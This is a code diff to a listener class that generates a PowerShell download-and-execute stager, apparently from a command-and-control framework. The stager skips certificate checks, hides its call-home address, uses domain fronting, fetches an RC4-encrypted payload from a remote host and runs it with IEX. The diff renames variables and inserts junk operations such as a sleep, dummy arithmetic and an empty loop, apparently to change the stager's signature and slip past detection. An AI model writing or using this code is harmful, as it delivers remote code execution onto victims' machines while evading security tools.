@@ -256,29 +256,35 @@ class Listener:
             stager = '$ErrorActionPreference = "SilentlyContinue";'
 
             if safeChecks.lower() == "true":
-                stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
+                stager = "if(-not $PSVersionTable.PSVersion.Major -le 2 -and ($PSVersionTable.PSVersion.Major -eq 3 -or $PSVersionTable.PSVersion.Major -ge 4)){"
 
             for bypass in bypasses:
                 stager += bypass
 
             if safeChecks.lower() == "true":
-                stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"
+                stager += "}; [System.Net.ServicePointManager]::Expect100Continue=0;"
 
-            stager += "$wc=New-Object System.Net.WebClient;"
+            stager += "sleep(3);"
+
             if userAgent.lower() == "default":
                 profile = listenerOptions["DefaultProfile"]["Value"]
                 userAgent = profile.split("|")[1]
-            stager += f"$u='{ userAgent }';"
+            stager += f"$aua='{ userAgent }';"
 
             if "https" in host:
                 # allow for self-signed certificates for https connections
                 stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
             stager += (
-                f"$ser={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';"
+                f"$hom={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';"
             )
 
+            # code to turn the key string into a byte array
+            stager += f"$Kk=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
+            
+            stager += "$wc=New-Object System.Net.WebClient;"
+            stager += "$f1=1 + 2 * 3;"
             if userAgent.lower() != "none":
-                stager += "$wc.Headers.Add('User-Agent',$u);"
+                stager += "$wc.Headers.Add('User-Agent',$aua);"
 
                 if proxy.lower() != "none":
                     if proxy.lower() == "default":
@@ -320,9 +326,7 @@ class Listener:
                 else:
                     host = "http://" + "[" + str(bindIP) + "]" + ":" + str(port)
 
-            # code to turn the key string into a byte array
-            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
-
+            stager += f"$f2=$f1*4;"
             # this is the minimized RC4 stager code from rc4.ps1
             stager += listener_util.powershell_rc4()
 
@@ -345,18 +349,19 @@ class Listener:
                     # If host header defined, assume domain fronting is in use and add a call to the base URL first
                     # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                     if headerKey.lower() == "host":
-                        stager += "try{$ig=$wc.DownloadData($ser)}catch{};"
+                        stager += "try{$ig=$wc.DownloadData($hom)}catch{};"
                     stager += (
                         "$wc.Headers.Add(" + f"'{headerKey}','" + headerValue + "');"
                     )
 
             # add the RC4 packet to a cookie
             stager += f'$wc.Headers.Add("Cookie","{ cookie }={ b64RoutingPacket.decode("UTF-8") }");'
-            stager += "$data=$wc.DownloadData($ser+$t);"
-            stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
+            stager += "$mdata=$wc.DownloadData($hom+$t);"
+            stager += "$iv=$mdata[0..3];$mdata=$mdata[4..$mdata.length];"
+            stager += "0..300 | ForEach-Object { $_ };"
 
             # decode everything and kick it over to IEX to kick off execution
-            stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"
+            stager += "$t5 = -join[Char[]](& $R $mdata ($IV+$Kk)); $T5 | IEX"
 
             # Remove comments and make one line
             stager = helpers.strip_powershell_comments(stager)
